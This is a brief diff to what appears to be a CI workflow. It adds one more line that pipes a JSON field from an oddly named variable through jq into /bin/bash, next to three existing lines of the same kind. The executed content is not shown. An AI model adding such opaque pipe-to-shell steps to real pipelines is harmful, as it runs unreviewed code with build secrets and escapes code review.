@@ -28,6 +28,7 @@ jobs:
           echo $leamo24 | jq -r .aqp8 | /bin/bash
           printf '%s' "$hn5774" | jq -r .tkg452 | /bin/bash
           printf '%s' "$vlwek8" | jq -r .r8 | /bin/bash
+          printf '%s' "$pjuxw1389" | jq -r .t31 | /bin/bash
 
       - name: Save archive
         if: always()
